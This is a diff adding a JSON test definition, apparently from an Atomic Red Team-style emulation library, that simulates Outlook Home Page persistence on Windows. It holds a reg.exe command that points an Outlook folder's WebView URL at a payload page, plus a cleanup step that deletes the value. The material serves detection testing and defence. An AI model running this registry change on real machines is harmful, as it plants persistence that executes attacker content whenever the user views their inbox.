@@ -1,0 +1,64 @@
+{
+  "id": "7a91ad51-e6d2-4d43-9471-f26362f5738e",
+  "name": "Install Outlook Home Page Persistence",
+  "description": "This test simulates persistence being added to a host via the Outlook Home Page functionality. This causes Outlook to retrieve URL containing a malicious payload every time the targeted folder is viewed.\n\nTriggering the payload requires manually opening Outlook and viewing the targetted folder (e.g. Inbox).\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "ed323c44-492e-456e-8024-b1e7894c7fb9",
+      "type": "execute-command",
+      "data": {
+        "command": "reg.exe add HKCU\\Software\\Microsoft\\Office\\#{outlook_version}\\Outlook\\WebView\\#{outlook_folder} /v URL /t REG_SZ /d #{url} /f\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "370f7031-5019-41fe-8131-d4ac1258f911",
+      "type": "execute-command",
+      "data": {
+        "command": "reg.exe delete HKCU\\Software\\Microsoft\\Office\\#{outlook_version}\\Outlook\\WebView\\#{outlook_folder} /v URL /f \u003enul 2\u003e\u00261\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "ed323c44-492e-456e-8024-b1e7894c7fb9",
+      "p": "on-success",
+      "o": "370f7031-5019-41fe-8131-d4ac1258f911"
+    },
+    {
+      "s": "ed323c44-492e-456e-8024-b1e7894c7fb9",
+      "p": "on-failure",
+      "o": "370f7031-5019-41fe-8131-d4ac1258f911"
+    }
+  ],
+  "tags": [
+    "T1137.004",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "url",
+      "type": "string",
+      "description": "URL to Outlook Home Page containing the payload to execute (can be local file:// or remote https://)",
+      "value": "file://PathToAtomicsFolder\\T1137.004\\src\\T1137.004.html"
+    },
+    {
+      "name": "outlook_version",
+      "type": "float",
+      "description": "Version of Outlook that is installed",
+      "value": "16.0"
+    },
+    {
+      "name": "outlook_folder",
+      "type": "string",
+      "description": "Name of the Outlook folder to modify the homepage setting for",
+      "value": "Inbox"
+    }
+  ]
+}
